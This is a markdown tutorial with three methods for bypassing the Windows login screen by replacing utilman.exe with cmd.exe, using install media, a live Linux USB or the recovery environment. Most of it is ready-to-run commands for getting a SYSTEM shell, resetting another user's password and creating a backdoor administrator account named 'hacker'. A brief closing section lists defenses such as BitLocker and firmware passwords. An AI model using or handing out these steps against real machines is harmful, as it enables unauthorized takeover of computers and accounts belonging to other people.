# Windows Login Bypass via utilman.exe Replacement

## Why This Works

* At the Windows login screen, pressing **Win + U** (or clicking the Ease of Access button) launches `utilman.exe` **as SYSTEM** before login.
* If `utilman.exe` is replaced with `cmd.exe`, you get a SYSTEM-level command prompt — which can reset passwords or create new admin accounts.

## Method 1 — Windows Installation Media

**Requirements:**

* Bootable Windows installer USB/DVD
* BitLocker disabled (or recovery key)

**Steps:**

1. Boot from Windows installation media.

2. At the language selection screen, press **Shift + F10** to open Command Prompt.

3. Identify Windows partition:

   ```cmd
   diskpart
   list volume
   exit
   ```

4. Go to System32:

   ```cmd
   cd C:\Windows\System32
   ```

   *(Replace `C:` with the correct drive letter if needed)*

5. Backup and replace utilman.exe:

   ```cmd
   rename utilman.exe utilman_backup.exe
   copy cmd.exe utilman.exe
   ```

6. Reboot (remove USB).
   At login, press **Win + U** → SYSTEM command prompt appears.

7. Reset password:

   ```cmd
   net user username newpassword
   ```

   Or create new admin:

   ```cmd
   net user hacker pass123 /add
   net localgroup administrators hacker /add
   ```

8. Restore utilman.exe after login:

   ```cmd
   copy utilman_backup.exe utilman.exe
   ```

---

## Method 2 — Live Linux USB

**Requirements:**

* Bootable Linux live USB (Ubuntu, Kali, etc.)
* BitLocker disabled (or recovery key)

**Steps:**

1. Boot from the live Linux USB.
2. Mount the Windows partition:

   ```bash
   sudo fdisk -l
   sudo mount /dev/sda1 /mnt   # replace sda1 with correct partition
   ```

3. Go to System32:

   ```bash
   cd /mnt/Windows/System32
   ```

4. Backup and replace utilman.exe:

   ```bash
   mv utilman.exe utilman_backup.exe
   cp cmd.exe utilman.exe
   ```

5. Reboot into Windows and trigger with **Win + U**.

## Method 3 — From Windows Recovery Environment (No External Media)

**When It Works:**

* If you can access the **Advanced Startup Options** before login (Shift + Restart, or automatic recovery after failed boots).
* No BitLocker, or you have recovery key.

**Steps:**

1. From login screen → click **Power** → hold **Shift** → click **Restart**.
2. Choose:

   ```cmd
   Troubleshoot → Advanced options → Command Prompt
   ```

3. In the terminal, find Windows drive:

   ```cmd
   diskpart
   list volume
   exit
   ```

4. Replace utilman.exe:

   ```cmd
   cd C:\Windows\System32
   rename utilman.exe utilman_backup.exe
   copy cmd.exe utilman.exe
   ```

5. Close Command Prompt, continue to login screen, press **Win + U**.

---

## **Defense Against This Attack**

* **Enable BitLocker** — stops offline modification without key.
* **Secure Boot** — reduces chance of unsigned OS modification.
* **BIOS/UEFI Password** — prevents boot order changes.
* **Disable external boot devices** — no USB/DVD boot.
* **Monitor physical access** — the method requires being at the machine.

---
